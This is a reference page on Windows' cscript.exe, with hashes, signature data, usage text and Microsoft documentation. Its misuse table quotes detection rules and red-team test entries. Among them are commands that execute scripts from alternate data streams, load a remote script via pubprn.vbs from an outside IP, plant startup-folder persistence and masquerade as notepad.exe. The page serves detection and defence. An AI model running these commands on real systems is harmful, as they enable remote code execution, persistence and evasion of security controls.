---
title: cscript.exe | Microsoft  Console Based Script Host
excerpt: What is cscript.exe?
---

# cscript.exe 

* File Path: `C:\Windows\system32\cscript.exe`
* Description: Microsoft  Console Based Script Host

## Hashes

Type | Hash
-- | --
MD5 | `B8454647EFC71192BF7B1572D18F7BD8`
SHA1 | `C3D511D4CF77C50D00A5264C6BB3AE44E5008831`
SHA256 | `C69648B049E35FF96523C911737A0481D52DD06508A561094A4FA895A30A6535`
SHA384 | `DB3D26C62456D1EA44E1B6C959539630F99F6B94BF8A0C567CDB1B4069554FE1E1C9C3BB1A8B1E1C78ECF1622B5A572A`
SHA512 | `14FBAA714126804AF732ADA044D2B69BFBD1514BFA553D732D70025A6B3AB5CAC0CF05F5B1F0F2758418EFACDFE405E534C81C1145110B5E5401911379B8719E`
SSDEEP | `3072:M4j8J582MJlfBNezPd2002mm0R/EOhjULtqqM6IZxtt:Nj8olPfBNeT40DmmcUqqMfZh`
IMP | `2B44D2206B9865383429E9C1524F1CAC`
PESHA1 | `4E424D3592615E730F73EDE98879B1A3B4914FEC`
PE256 | `B345760307FB0443F1CA9F07E81BBCD393094897BEF6F2C2B67F59B252065610`

## Runtime Data

### Usage (stdout):
```cmhg
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

Usage: CScript scriptname.extension [option...] [arguments...]

Options:
 //B         Batch mode: Suppresses script errors and prompts from displaying
 //D         Enable Active Debugging
 //E:engine  Use engine for executing script
 //H:CScript Changes the default script host to CScript.exe
 //H:WScript Changes the default script host to WScript.exe (default)
 //I         Interactive mode (default, opposite of //B)
 //Job:xxxx  Execute a WSF job
 //Logo      Display logo (default)
 //Nologo    Prevent logo display: No banner will be shown at execution time
 //S         Save current command line options for this user
 //T:nn      Time out in seconds:  Maximum time a script is permitted to run
 //X         Execute script in debugger
 //U         Use Unicode for redirected I/O from the console

```

### Loaded Modules:

Path |
-- |
C:\Windows\system32\cscript.exe |
C:\Windows\System32\KERNEL32.DLL |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\SYSTEM32\ntdll.dll |


## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: cscript.exe.mui
* Product Name: Microsoft  Windows Script Host
* Company Name: Microsoft Corporation
* File Version: 5.812.10240.16384
* Product Version: 5.812.10240.16384
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/76
* VirusTotal Link: https://www.virustotal.com/gui/file/c69648b049e35ff96523c911737a0481d52dd06508a561094a4fa895a30a6535/detection


## Possible Misuse

*The following table contains possible examples of `cscript.exe` being misused. While `cscript.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [godmode_sigma_rule.yml](https://github.com/Neo23x0/sigma/blob/master/other/godmode_sigma_rule.yml) | `- '\cscript.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [godmode_sigma_rule.yml](https://github.com/Neo23x0/sigma/blob/master/other/godmode_sigma_rule.yml) | `- 'cscript'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_dbghelp_dbgcore_load.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_suspicious_dbghelp_dbgcore_load.yml) | `- '\cscript.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_apt_cloudhopper.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_cloudhopper.yml) | `description: Detects suspicious file execution by wscript and cscript`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_apt_cloudhopper.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_cloudhopper.yml) | `Image: '*\cscript.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_html_help_spawn.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_html_help_spawn.yml) | `- '\cscript.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_malware_script_dropper.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_malware_script_dropper.yml) | `title: WScript or CScript Dropper`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_malware_script_dropper.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_malware_script_dropper.yml) | `description: Detects wscript/cscript executions of scripts located in user directories`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_malware_script_dropper.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_malware_script_dropper.yml) | `- '*\cscript.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mal_adwind.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mal_adwind.yml) | `- '*cscript.exe *Retrive*.vbs *'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mmc_spawn_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mmc_spawn_shell.yml) | `- '*\cscript.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mshta_spawn_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_spawn_shell.yml) | `- '*\cscript.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_multiple_suspicious_cli.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_multiple_suspicious_cli.yml) | `- cscript.exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_office_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml) | `- '*\cscript.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml) | `- 'cscript.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml) | `- '\cscript.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary_highly_relevant.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary_highly_relevant.yml) | `- "cscript.exe"`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary_highly_relevant.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary_highly_relevant.yml) | `- '*\cscript.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_shell_spawn_susp_program.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shell_spawn_susp_program.yml) | `- '*\cscript.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_csc.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_csc.yml) | `- '*\cscript.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_powershell_parent_combo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_powershell_parent_combo.yml) | `- '*\cscript.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_script_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_script_execution.yml) | `description: Detects suspicious file execution by wscript and cscript`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_script_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_script_execution.yml) | `- '\cscript.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_task_folder_evasion.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_task_folder_evasion.yml) | `description: The Tasks folder in system32 and syswow64 are globally writable paths. Adversaries can take advantage of this and load or influence any script hosts or ANY .NET Application in Tasks to load and execute a custom assembly into cscript, wscript, regsvr32, mshta, eventvwr`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_susp_run_key_img_folder.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/registry_event/sysmon_susp_run_key_img_folder.yml) | `- 'cscript*'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_cactustorch.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_cactustorch.yml) | `- '*\System32\cscript.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Testxlst.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherScripts/Testxlst.yml) | `- Command: cscript testxlst.js C:\test\test.xml c:\test\test.xls c:\test\test.out`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cscript.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cscript.yml) | `Name: Cscript.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cscript.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cscript.yml) | `- Command: cscript c:\ads\file.txt:script.vbs`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cscript.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cscript.yml) | `Description: Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS).`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cscript.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cscript.yml) | `- Path: C:\Windows\System32\cscript.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cscript.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cscript.yml) | `- Path: C:\Windows\SysWOW64\cscript.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cscript.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cscript.yml) | `- IOC: Cscript.exe executing files from alternate data streams`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Manage-bde.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Manage-bde.yml) | `- Command: set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Manage-bde.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Manage-bde.yml) | `- Command: copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Winrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Winrm.yml) | `- Command: '%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty'`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Winrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Winrm.yml) | `Description: Bypass AWL solutions by copying and executing cscript.exe and malicious XSL documents from attacker controlled location`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #3: Masquerading - cscript.exe running as notepad.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #3: Masquerading - cscript.exe running as notepad.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | - [Atomic Test #3 - Masquerading - cscript.exe running as notepad.exe](#atomic-test-3---masquerading---cscriptexe-running-as-notepadexe) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | ## Atomic Test #3 - Masquerading - cscript.exe running as notepad.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | Copies cscript.exe, renames it, and launches it to masquerade as an instance of notepad.exe. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | Upon successful execution, cscript.exe is renamed as notepad.exe and executed from non-standard path. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.005/T1059.005.md) | cscript #{vbscript} > $env:TEMP\T1059.005.out.txt | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1082.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md) | cscript #{vbscript} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | CScript.exe AtomicTestT1105.js //E:JScript | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1204.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md) | This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1204.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md) | $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1204.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md) | Uses cscript //E:jscript to download a file | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1204.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md) | cscript //E:Jscript #{script_file} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | cscript %windir%\System32\manage-bde.wsf | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216.001/T1216.001.md) | <code>PubPrn.vbs</code> is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and can be used to proxy execution from a remote site.(Citation: Enigma0x3 PubPrn Bypass) An example command is <code>cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png</code>.</blockquote> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216.001/T1216.001.md) | cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:#{remote_payload}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1547.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md) | cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1547.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md) | cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1547.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md) | cscript.exe /E:Jscript "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1547.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md) | cscript.exe /E:Jscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_monsoon.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_monsoon.yar) | $x3 = " cscript.[BACKSPA[PAGE DO[CAPS LO[PAGE UPTPX498.dTPX499.d" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_oilrig.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar) | $x2 = "cscript.exe //T:20 //Nologo " fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_oilrig.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar) | $a1 = "taskkill /F /IM cscript.exe" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_scripts.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_scripts.yar) | $s1 = "/c \"C:\\windows\\temp\\cscript\" C:\\windows\\temp\\iis.vbs" fullword ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [crime_wannacry.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/crime_wannacry.yar) | $s2 = "cscript.exe //nologo m.vbs" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_url_persitence.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_url_persitence.yar) | $file1 = /[\x0a\x0d](IconFile\|(Base\|)URL)\s*=[^\x0d]*(powershell\|cmd\|certutil\|mshta\|wscript\|cscript\|rundll32\|wmic\|regsvr32\|msbuild)(\.exe\|)[^\x0d]{2,50}\x0d/ nocase | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)

## Additional Info*

**The information below is copied from [MicrosoftDocs](https://github.com/MicrosoftDocs/windowsserverdocs), which is maintained by [Microsoft](https://opensource.microsoft.com/codeofconduct/). Available under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) license.*

---
## cscript

> Applies to: Windows Server (Semi-Annual Channel), Windows Server 2019, Windows Server 2016, Windows Server 2012 R2, Windows Server 2012

Starts a script to run in a command-line environment.

>[!IMPORTANT]
> Performing this task does not require you to have administrative credentials. Therefore, as a security best practice, consider performing this task as a user without administrative credentials.

### Syntax

```
cscript <scriptname.extension> [/b] [/d] [/e:<engine>] [{/h:cscript | /h:wscript}] [/i] [/job:<identifier>] [{/logo | /nologo}] [/s] [/t:<seconds>] [x] [/u] [/?] [<scriptarguments>]
```

##### Parameters

| Parameter | Description |
| --------- | ----------- |
| scriptname.extension | Specifies the path and file name of the script file with optional file name extension. |
| /b | Specifies batch mode, which does not display alerts, scripting errors, or input prompts. |
| /d | Starts the debugger. |
| /e:`<engine>` | Specifies the engine that is used to run the script. |
| /h:cscript | Registers cscript.exe as the default script host for running scripts. |
| /h:wscript | Registers wscript.exe as the default script host for running scripts. This is the default. |
| /i | Specifies interactive mode, which displays alerts, scripting errors, and input prompts. This is the default and the opposite of `/b`. |
| /job:<identifier> | Runs the job identified by *identifier* in a .wsf script file. |
| /logo | Specifies that the Windows Script Host banner is displayed in the console before the script runs. This is the default and the opposite of `/nologo`. |
| /nologo | Specifies that the Windows Script Host banner is not displayed before the script runs. |
| /s | Saves the current command-prompt options for the current user. |
| /t:<seconds> | Specifies the maximum time the script can run (in seconds). You can specify up to 32,767 seconds. The default is no time limit. |
| /u | Specifies Unicode for input and output that is redirected from the console. |
| /x | Starts the script in the debugger. |
| /? | Displays available command parameters and provides help for using them. This is the same as typing **cscript.exe** with no parameters and no script. |
| scriptarguments | Specifies the arguments passed to the script. Each script argument must be preceded by a slash (**/**). |

##### Remarks

- Each parameter is optional; however, you can't specify script arguments without specifying a script. If you don't specify a script or any script arguments, cscript.exe displays the cscript.exe syntax and the valid host options.

- The **/t** parameter prevents excessive running of scripts by setting a timer. When the run time exceeds the specified value, cscript interrupts the script engine and ends the process.

- Windows script files usually have one of the following file name extensions: .wsf, .vbs, .js. Windows Script Host can use .wsf script files. Each .wsf file can use multiple scripting engines and perform multiple jobs.

- if you double-click a script file with an extension that has no association, the **Open With** dialog box appears. Select wscript or cscript, and then select **Always use this program to open this file type**. This registers wscript.exe or cscript as the default script host for files of this file type.

### Additional References

- [Command-Line Syntax Key](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/command-line-syntax-key.md)

---



MIT License. Copyright (c) 2020-2021 Strontic.


